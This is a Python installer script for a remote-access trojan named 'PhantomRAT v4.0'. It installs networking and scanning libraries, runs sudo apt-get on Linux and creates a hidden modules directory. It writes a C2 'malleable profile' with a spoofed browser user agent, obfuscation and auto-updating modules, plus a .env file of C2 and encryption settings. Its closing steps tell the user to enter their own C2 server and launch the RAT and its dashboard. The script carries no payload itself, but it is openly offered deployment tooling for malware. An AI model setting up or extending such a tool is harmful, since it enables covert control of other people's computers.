#!/usr/bin/env python3
"""
PhantomRAT v4.0 Setup Script
Automates installation and configuration
"""

import os
import sys
import subprocess
import platform
import json
import shutil
from pathlib import Path

def check_python_version():
    """Check Python version"""
    required = (3, 8)
    current = sys.version_info[:2]
    
    if current < required:
        print(f"[!] Python {required[0]}.{required[1]}+ required, found {current[0]}.{current[1]}")
        sys.exit(1)
    
    print(f"[+] Python version: {sys.version}")

def install_dependencies():
    """Install required packages"""
    print("[*] Installing dependencies...")
    
    requirements = [
        "Flask>=2.3.0",
        "requests>=2.31.0",
        "cryptography>=41.0.0",
        "psutil>=5.9.0",
        "paramiko>=3.2.0",
        "pillow>=10.0.0",
        "pycryptodome>=3.18.0",
        "python-nmap>=0.7.1",
        "pyyaml>=6.0",
        "colorama>=0.4.0",
        "python-dotenv>=1.0.0",
        "scapy>=2.5.0",
        "netifaces>=0.11.0",
        "tqdm>=4.65.0"
    ]
    
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + requirements)
        print("[+] Dependencies installed successfully")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to install dependencies: {e}")
        sys.exit(1)

def platform_specific_install():
    """Install platform-specific packages"""
    system = platform.system()
    
    if system == "Windows":
        print("[*] Installing Windows-specific packages...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "wmi", "pyperclip"])
            print("[+] Windows packages installed")
        except:
            print("[!] Failed to install Windows packages")
    
    elif system == "Linux":
        print("[*] Installing Linux-specific packages...")
        try:
            # Install system packages
            subprocess.check_call(["sudo", "apt-get", "update"], stdout=subprocess.DEVNULL)
            subprocess.check_call(["sudo", "apt-get", "install", "-y", "nmap", "python3-tk"], 
                                 stdout=subprocess.DEVNULL)
            print("[+] Linux packages installed")
        except:
            print("[!] Failed to install Linux packages")
    
    elif system == "Darwin":
        print("[*] Installing macOS-specific packages...")
        try:
            subprocess.check_call(["brew", "install", "nmap"], 
                                 stdout=subprocess.DEVNULL)
            print("[+] macOS packages installed")
        except:
            print("[!] Failed to install macOS packages")

def create_directory_structure():
    """Create necessary directories"""
    directories = [
        "data",
        "logs",
        "cache",
        ".phantom_modules",
        "templates",
        "static/css",
        "static/js",
        "static/images"
    ]
    
    for directory in directories:
        Path(directory).mkdir(parents=True, exist_ok=True)
        print(f"[+] Created directory: {directory}")

def create_config_files():
    """Create configuration files"""
    configs = {
        "malleable_profile.json": json.dumps({
            "version": "4.0",
            "c2": {
                "primary": "http://localhost:8000",
                "fallback": [],
                "connection_timeout": 30,
                "retry_attempts": 3
            },
            "encryption": {
                "key": "PBKDF2-HMAC-SHA256",
                "algorithm": "AES-256-CBC"
            },
            "security": {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "obfuscation": True
            },
            "modules": {
                "enabled": ["sysinfo", "fileops", "network"],
                "auto_update": True
            }
        }, indent=2),
        
        ".env": "\n".join([
            "# PhantomRAT Environment Variables",
            "PHANTOM_C2_SERVER=localhost",
            "PHANTOM_C2_PORT=8000",
            "PHANTOM_ENCRYPTION_KEY=phantomrat_32_char_encryption_key_here",
            "PHANTOM_LOG_LEVEL=INFO",
            "PHANTOM_MAX_THREADS=10"
        ]),
        
        "requirements.txt": "\n".join([
            "Flask>=2.3.0",
            "requests>=2.31.0",
            "cryptography>=41.0.0",
            "psutil>=5.9.0",
            "paramiko>=3.2.0",
            "pillow>=10.0.0",
            "pycryptodome>=3.18.0",
            "python-nmap>=0.7.1",
            "pyyaml>=6.0",
            "colorama>=0.4.0",
            "python-dotenv>=1.0.0",
            "scapy>=2.5.0",
            "netifaces>=0.11.0",
            "tqdm>=4.65.0"
        ])
    }
    
    for filename, content in configs.items():
        with open(filename, 'w') as f:
            f.write(content)
        print(f"[+] Created {filename}")

def set_file_permissions():
    """Set appropriate file permissions"""
    if platform.system() != "Windows":
        try:
            os.chmod("main.py", 0o755)
            os.chmod("c2_server.py", 0o755)
            os.chmod("run.py", 0o755)
            print("[+] Set executable permissions")
        except:
            pass

def main():
    """Main setup function"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║          PHANTOM RAT v4.0 SETUP                  ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    print("[*] Starting setup process...")
    
    # Run setup steps
    check_python_version()
    install_dependencies()
    platform_specific_install()
    create_directory_structure()
    create_config_files()
    set_file_permissions()
    
    print("\n[+] Setup completed successfully!")
    print("\nNext steps:")
    print("1. Edit 'malleable_profile.json' with your C2 server details")
    print("2. Edit '.env' with your configuration")
    print("3. Run: python setup.py (already done)")
    print("4. Start PhantomRAT: python run.py --mode both")
    print("5. Access dashboard: http://localhost:8000")
    
if __name__ == "__main__":
    main()

